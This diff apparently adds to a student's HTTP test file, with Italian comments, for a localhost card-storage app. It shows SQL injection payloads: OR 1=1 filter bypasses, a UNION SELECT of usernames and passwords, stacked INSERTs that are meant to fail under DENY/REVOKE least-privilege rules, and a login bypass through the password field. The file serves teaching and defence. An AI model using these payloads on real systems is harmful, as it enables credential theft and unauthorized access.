@@ -202,3 +202,69 @@ GET {{baseurldb2}}/cards/list-secure?text=aaaa'%20OR%20'1'='1'%20OR%20'1'='
 Accept: application/json
 
 
+### [ATTACCO - DB1] Least Privilege - Tentativo di INSERT
+GET {{baseurldb1}}/cards/list-secure?text=%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20Users--
+Accept: application/json
+
+
+### ==========================================================================
+### 🖥️ VARIABILI GLOBALI
+### ==========================================================================
+@baseUrl = https://localhost:7056
+@contentType = application/json
+
+### ==========================================================================
+### 🟨 SEZIONE 1: SQL SERVER (Endpoint: db1)
+### ==========================================================================
+
+### 1.1 SQL Server - Ricerca lecita (Funziona normalmente)
+GET {{baseUrl}}/api/db1/cards/list?text=Visa
+Accept: {{contentType}}
+
+### 1.2 SQL Server - SQL Injection di Lettura (Bypass dei filtri)
+# Sfrutta il LIKE '%' per mostrare TUTTE le carte nel database
+GET {{baseUrl}}/api/db1/cards/list?text=x' OR 1=1--
+Accept: {{contentType}}
+
+### 1.3 SQL Server - SQL Injection di Scrittura (Bloccata dal DENY)
+# Tenta di inserire una carta. L'app risponde 200 OK (C# ignora l'errore nel batch),
+# ma se controlli nel database la carta '6666' NON sarà stata inserita.
+GET {{baseUrl}}/api/db1/cards/list?text='; INSERT INTO Cards (number, expirydate, issuer, code) VALUES ('6666', GETDATE(), 'Hacker', '123')--
+Accept: {{contentType}}
+
+
+### ==========================================================================
+### 🐘 SEZIONE 2: POSTGRESQL (Endpoint: db2)
+### ==========================================================================
+
+### 2.1 Postgres - Ricerca lecita (Funziona normalmente)
+GET {{baseUrl}}/api/db2/cards/list?text=Visa
+Accept: {{contentType}}
+
+### 2.2 Postgres - SQL Injection di Lettura (Bypass dei filtri)
+# Sfrutta l'or per mostrare TUTTE le carte nel database
+GET {{baseUrl}}/api/db2/cards/list?text=x' OR 1=1--
+Accept: {{contentType}}
+
+### 2.3 Postgres - SQL Injection di Scrittura (Bloccata dal REVOKE)
+# Tenta di inserire una carta. Postgres blocca l'azione a livello atomico 
+# e risponde con l'errore 500 "42501: permission denied for table cards".
+GET {{baseUrl}}/api/db2/cards/list?text='; INSERT INTO cards (number, issuer) VALUES ('7777', 'Hacker')--
+Accept: {{contentType}}
+
+
+### ==========================================================================
+### 🔐 SEZIONE 3: AUTHENTICATION BYPASS (Il Login)
+### ==========================================================================
+
+### 3.1 Login - Tentativo di attacco con SQL Injection
+# Questo attacco inganna il codice C# e permette di entrare come 'admin' del sito.
+# Spiega al prof che l'accesso riesce perché 'app_reader' ha i permessi di SELECT su Users,
+# ma i privilegi dell'admin rimangono confinati alle pagine web (non scalano sul DB).
+POST {{baseUrl}}/api/auth/login
+Content-Type: {{contentType}}
+
+{
+  "username": "admin",
+  "password": "' OR username = 'admin' --"
+}
